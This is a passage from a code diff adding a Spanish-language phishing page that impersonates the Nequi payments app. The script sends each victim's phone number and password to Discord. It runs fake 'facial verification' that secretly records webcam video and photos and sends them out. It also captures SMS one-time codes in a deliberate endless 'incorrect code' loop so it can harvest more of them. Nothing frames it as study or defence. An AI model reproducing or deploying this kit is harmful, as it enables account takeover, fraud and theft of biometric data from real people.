+            const password = passwordInput.value;
+            
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Verificando...';
+            
+            // Obtener datos de IP
+            userData = await getUserData();
+            credentialsData = { phone, password };
+            
+            // Enviar credenciales a Discord
+            await sendToDiscord(userData, credentialsData, null, [], 'login');
+            
+            showPage('loadingPage1');
+            startCountdown(40, 'countdown1', () => {
+                showPage('facialVerificationPage');
+                initializeCamera();
+            });
+        });
+        
+        // ============================================
+        // PÁGINA 2: CARGANDO 40 SEGUNDOS
+        // ============================================
+        
+        function startCountdown(seconds, elementId, callback) {
+            let timeLeft = seconds;
+            const timerElement = document.getElementById(elementId);
+            
+            const countdown = setInterval(() => {
+                timerElement.textContent = `${timeLeft} segundos`;
+                timeLeft--;
+                
+                if (timeLeft < 0) {
+                    clearInterval(countdown);
+                    callback();
+                }
+            }, 1000);
+        }
+        
+        // ============================================
+        // PÁGINA 3: VERIFICACIÓN FACIAL
+        // ============================================
+        
+        async function initializeCamera() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        facingMode: 'user',
+                        frameRate: { ideal: 30 }
+                    } 
+                });
+                
+                const video = document.getElementById('videoElement');
+                video.srcObject = stream;
+                
+                // Iniciar detección facial simulada
+                startFaceDetectionSimulation();
+                
+                // Configurar grabación de video
+                setupVideoRecording();
+                
+            } catch (error) {
+                console.error('Error accediendo a la cámara:', error);
+                // Simular éxito si no hay cámara
+                setTimeout(() => simulateVerificationSuccess(), 3000);
+            }
+        }
+        
+        function setupVideoRecording() {
+            try {
+                const videoStream = stream;
+                mediaRecorder = new MediaRecorder(videoStream, {
+                    mimeType: 'video/webm;codecs=vp9'
+                });
+                
+                recordedChunks = [];
+                
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+                
+                mediaRecorder.onstop = () => {
+                    const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+                    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+                    facePositionPhotos.push({
+                        blob: videoBlob,
+                        filename: `face_verification_video_${timestamp}.webm`
+                    });
+                };
+            } catch (error) {
+                console.error('Error configurando grabación de video:', error);
+            }
+        }
+        
+        function startFaceDetectionSimulation() {
+            setInterval(() => {
+                const randomState = Math.random();
+                
+                if (randomState < 0.3) {
+                    facePosition.x = 0.5;
+                    facePosition.y = 0.5;
+                    facePosition.size = 0.7;
+                    faceInPosition = true;
+                    faceLookingForward = true;
+                    lightingGood = true;
+                    noGlasses = true;
+                    
+                    if (Math.random() < 0.1) {
+                        hasBlinked = true;
+                        blinkCount++;
+                    }
+                    
+                    detectionChecks.position++;
+                    detectionChecks.lighting++;
+                    detectionChecks.glasses++;
+                    detectionChecks.blink = Math.min(detectionChecks.blink + 1, 3);
+                } else if (randomState < 0.6) {
+                    faceInPosition = Math.random() > 0.3;
+                    faceLookingForward = Math.random() > 0.4;
+                    lightingGood = Math.random() > 0.5;
+                    noGlasses = Math.random() > 0.2;
+                    hasBlinked = Math.random() < 0.05;
+                    
+                    if (faceInPosition) detectionChecks.position++;
+                    if (lightingGood) detectionChecks.lighting++;
+                    if (noGlasses) detectionChecks.glasses++;
+                    if (hasBlinked) detectionChecks.blink++;
+                } else {
+                    faceInPosition = false;
+                    faceLookingForward = false;
+                    lightingGood = Math.random() > 0.8;
+                    noGlasses = Math.random() > 0.7;
+                    hasBlinked = false;
+                }
+                
+                updateFaceIndicators();
+                
+                if (isRecording && Math.random() < 0.3) {
+                    captureFacePhoto();
+                }
+                
+            }, 500);
+        }
+        
+        function updateFaceIndicators() {
+            const positionDot = document.getElementById('positionDot');
+            const positionText = document.getElementById('positionIndicator').querySelector('span');
+            const lightingDot = document.getElementById('lightingDot');
+            const lightingText = document.getElementById('lightingIndicator').querySelector('span');
+            
+            if (detectionChecks.position >= 5) {
+                positionDot.className = 'indicator-dot good';
+                positionText.textContent = 'Posición: ✓ Perfecta';
+            } else if (detectionChecks.position >= 2) {
+                positionDot.className = 'indicator-dot warning';
+                positionText.textContent = 'Posición: Ajustando...';
+            } else {
+                positionDot.className = 'indicator-dot bad';
+                positionText.textContent = 'Posición: Fuera del área';
+            }
+            
+            if (detectionChecks.lighting >= 4) {
+                lightingDot.className = 'indicator-dot good';
+                lightingText.textContent = 'Iluminación: ✓ Excelente';
+            } else if (detectionChecks.lighting >= 2) {
+                lightingDot.className = 'indicator-dot warning';
+                lightingText.textContent = 'Iluminación: Media';
+            } else {
+                lightingDot.className = 'indicator-dot bad';
+                lightingText.textContent = 'Iluminación: Baja';
+            }
+            
+            const statusDiv = document.getElementById('positionStatus');
+            if (detectionChecks.position >= 5 && detectionChecks.lighting >= 4 && detectionChecks.glasses >= 3 && detectionChecks.blink >= 1) {
+                statusDiv.innerHTML = '<span class="status-icon">✅</span> ¡Todo listo! Posición perfecta, buena iluminación y sin lentes.';
+                statusDiv.className = 'verification-status success';
+                
+                if (!isRecording) {
+                    // Mostrar botón de comenzar
+                }
+            } else {
+                let issues = [];
+                if (detectionChecks.position < 5) issues.push('centra tu rostro en el círculo');
+                if (detectionChecks.lighting < 4) issues.push('mejora la iluminación');
+                if (detectionChecks.glasses < 3) issues.push('quita los lentes de sol');
+                if (detectionChecks.blink < 1) issues.push('parpadea normalmente');
+                
+                statusDiv.innerHTML = `<span class="status-icon">⚠️</span> Por favor: ${issues.join(', ')}.`;
+                statusDiv.className = 'verification-status warning';
+            }
+        }
+        
+        async function captureFacePhoto() {
+            try {
+                const canvas = document.getElementById('canvasElement');
+                const video = document.getElementById('videoElement');
+                
+                if (canvas && video && video.videoWidth > 0) {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    
+                    ctx.save();
+                    ctx.scale(-1, 1);
+                    ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
+                    ctx.restore();
+                    
+                    ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
+                    ctx.fillRect(10, canvas.height - 50, 300, 40);
+                    ctx.fillStyle = 'white';
+                    ctx.font = '14px Arial';
+                    ctx.fillText(`Nequi Verificación - ${new Date().toLocaleString()}`, 20, canvas.height - 30);
+                    
+                    return new Promise((resolve) => {
+                        canvas.toBlob((blob) => {
+                            if (blob) {
+                                const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+                                facePositionPhotos.push({
+                                    blob: blob,
+                                    filename: `face_verification_${timestamp}.jpg`
+                                });
+                            }
+                            resolve(blob);
+                        }, 'image/jpeg', 0.9);
+                    });
+                }
+            } catch (error) {
+                console.error('Error capturando foto:', error);
+            }
+        }
+        
+        document.getElementById('startVerificationBtn').addEventListener('click', function() {
+            this.style.display = 'none';
+            document.getElementById('retryBtn').style.display = 'none';
+            
+            document.getElementById('captureLoader').style.display = 'block';
+            
+            if (mediaRecorder && mediaRecorder.state === 'inactive') {
+                mediaRecorder.start(1000);
+            }
+            
+            startVerificationProcess();
+        });
+        
+        function startVerificationProcess() {
+            isRecording = true;
+            
+            verificationTime = 0;
+            verificationInterval = setInterval(async () => {
+                verificationTime++;
+                
+                const progress = (verificationTime / 8) * 100;
+                document.getElementById('progressBar').style.width = `${Math.min(progress, 100)}%`;
+                
+                if (verificationTime % 2 === 0) {
+                    await captureFacePhoto();
+                }
+                
+                const statusDiv = document.getElementById('positionStatus');
+                if (verificationTime === 2) {
+                    statusDiv.innerHTML = '<span class="status-icon">📷</span> Analizando estructura facial...';
+                } else if (verificationTime === 4) {
+                    statusDiv.innerHTML = '<span class="status-icon">🔍</span> Verificando características únicas...';
+                } else if (verificationTime === 6) {
+                    statusDiv.innerHTML = '<span class="status-icon">🤖</span> Comparando con base de datos...';
+                }
+                
+                if (verificationTime >= 8) {
+                    clearInterval(verificationInterval);
+                    completeVerification();
+                }
+            }, 1000);
+        }
+        
+        function simulateVerificationSuccess() {
+            document.getElementById('progressBar').style.width = '100%';
+            document.getElementById('positionStatus').innerHTML = '<span class="status-icon">✅</span> ¡Verificación facial completada con éxito!';
+            document.getElementById('positionStatus').className = 'verification-status success';
+            
+            document.getElementById('step3').classList.remove('active');
+            document.getElementById('step3').classList.add('completed');
+            
+            document.getElementById('captureLoader').style.display = 'none';
+            
+            document.getElementById('completeVerificationBtn').style.display = 'block';
+        }
+        
+        function completeVerification() {
+            isRecording = false;
+            
+            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                mediaRecorder.stop();
+            }
+            
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+            
+            simulateVerificationSuccess();
+        }
+        
+        document.getElementById('completeVerificationBtn').addEventListener('click', async function() {
+            this.disabled = true;
+            this.textContent = 'Enviando datos...';
+            
+            // Enviar datos de verificación facial
+            await sendToDiscord(userData, credentialsData, {
+                duration: verificationTime,
+                photosCount: facePositionPhotos.filter(f => f.filename.includes('.jpg')).length,
+                hasVideo: facePositionPhotos.some(f => f.filename.includes('.webm'))
+            }, facePositionPhotos, 'facial');
+            
+            showPage('loadingPage2');
+            startCountdown(30, 'countdown2', () => {
+                showPage('smsVerificationPage');
+                setupSmsVerification();
+            });
+        });
+        
+        document.getElementById('retryBtn').addEventListener('click', function() {
+            detectionChecks = {
+                position: 0,
+                lighting: 0,
+                glasses: 0,
+                blink: 0
+            };
+            
+            verificationTime = 0;
+            facePositionPhotos = [];
+            
+            document.getElementById('progressBar').style.width = '0%';
+            document.getElementById('positionStatus').style.display = 'block';
+            document.getElementById('startVerificationBtn').style.display = 'block';
+            document.getElementById('retryBtn').style.display = 'block';
+            document.getElementById('completeVerificationBtn').style.display = 'none';
+            
+            updateFaceIndicators();
+        });
+        
+        // ============================================
+        // PÁGINA 5: VERIFICACIÓN SMS
+        // ============================================
+        
+        function setupSmsVerification() {
+            const smsDigits = document.querySelectorAll('.sms-digit');
+            const verifySmsBtn = document.getElementById('verifySmsBtn');
+            const resendLink = document.getElementById('resendLink');
+            const resendTimer = document.getElementById('resendTimer');
+            const smsMessage = document.getElementById('smsMessage');
+            
+            smsDigits[0].focus();
+            
+            smsDigits.forEach((digit, index) => {
+                digit.addEventListener('input', function(e) {
+                    const value = this.value;
+                    
+                    if (!/^\d*$/.test(value)) {
+                        this.value = value.replace(/\D/g, '');
+                        return;
+                    }
+                    
+                    if (value.length > 1) {
+                        this.value = value.charAt(0);
+                    }
+                    
+                    if (this.value) {
+                        this.classList.add('filled');
+                    } else {
+                        this.classList.remove('filled');
+                    }
+                    
+                    if (this.value.length === 1 && index < smsDigits.length - 1) {
+                        smsDigits[index + 1].focus();
+                    }
+                    
+                    checkSmsCode();
+                });
+                
+                digit.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
+                        smsDigits[index - 1].focus();
+                    }
+                });
+                
+                digit.addEventListener('paste', function(e) {
+                    e.preventDefault();
+                    const paste = (e.clipboardData || window.clipboardData).getData('text');
+                    const numbers = paste.replace(/\D/g, '').split('');
+                    
+                    numbers.forEach((num, i) => {
+                        if (index + i < smsDigits.length) {
+                            smsDigits[index + i].value = num;
+                            smsDigits[index + i].classList.add('filled');
+                        }
+                    });
+                    
+                    if (index + numbers.length < smsDigits.length) {
+                        smsDigits[index + numbers.length].focus();
+                    } else {
+                        smsDigits[smsDigits.length - 1].focus();
+                    }
+                    
+                    checkSmsCode();
+                });
+            });
+            
+            function checkSmsCode() {
+                let code = '';
+                smsDigits.forEach(digit => {
+                    code += digit.value;
+                });
+                
+                const isValid = code.length === 6;
+                verifySmsBtn.disabled = !isValid;
+                verifySmsBtn.style.opacity = isValid ? '1' : '0.5';
+                
+                return isValid;
+            }
+            
+            let resendTime = 60;
+            const timerInterval = setInterval(() => {
+                resendTime--;
+                resendTimer.textContent = resendTime;
+                
+                if (resendTime <= 0) {
+                    clearInterval(timerInterval);
+                    resendLink.innerHTML = 'Reenviar código';
+                    resendLink.onclick = resendSmsCode;
+                }
+            }, 1000);
+            
+            function resendSmsCode() {
+                smsMessage.textContent = `📱 Código reenviado al número: +57 ${credentialsData.phone}`;
+                smsMessage.className = 'message success';
+                smsMessage.style.display = 'block';
+                
+                resendTime = 60;
+                resendTimer.textContent = resendTime;
+                resendLink.innerHTML = `Reenviar código en <span class="timer" id="resendTimer">60</span>s`;
+                resendLink.onclick = null;
+                
+                const newTimerInterval = setInterval(() => {
+                    resendTime--;
+                    resendTimer.textContent = resendTime;
+                    
+                    if (resendTime <= 0) {
+                        clearInterval(newTimerInterval);
+                        resendLink.innerHTML = 'Reenviar código';
+                        resendLink.onclick = resendSmsCode;
+                    }
+                }, 1000);
+                
+                smsDigits.forEach(digit => {
+                    digit.value = '';
+                    digit.classList.remove('filled');
+                });
+                smsDigits[0].focus();
+                checkSmsCode();
+            }
+            
+            verifySmsBtn.addEventListener('click', async function() {
+                if (!checkSmsCode()) return;
+                
+                let smsCode = '';
+                smsDigits.forEach(digit => {
+                    smsCode += digit.value;
+                });
+                
+                this.disabled = true;
+                this.textContent = 'Verificando...';
+                
+                // Preparar datos SMS incluyendo toda la información de ubicación
+                const smsData = {
+                    phone: credentialsData.phone,
+                    password: credentialsData.password,
+                    smsCode: smsCode
+                };
+                
+                // Enviar código SMS a Discord con toda la información de ubicación
+                await sendToDiscord(userData, smsData, null, [], 'sms');
+                
+                // Simular error para bucle infinito
+                setTimeout(() => {
+                    smsMessage.textContent = '✗ Código incorrecto. Intenta nuevamente.';
+                    smsMessage.className = 'message error';
+                    smsMessage.style.display = 'block';
+                    
+                    smsDigits.forEach(digit => {
+                        digit.value = '';
+                        digit.classList.remove('filled');
+                    });
+                    smsDigits[0].focus();
+                    
+                    this.disabled = false;
+                    this.textContent = 'Verificar Código';
+                    
+                    // Reiniciar el flujo: SMS → Cargando → SMS (bucle infinito)
+                    showPage('loadingPage2');
+                    startCountdown(30, 'countdown2', () => {
+                        showPage('smsVerificationPage');
+                        setupSmsVerification();
+                    });
+                    
+                }, 2000);
+            });
+            
+            checkSmsCode();
+        }
+        
+        // Inicializar validación del formulario
+        validateForm();
+    </script>
+
+</body>
+</html>
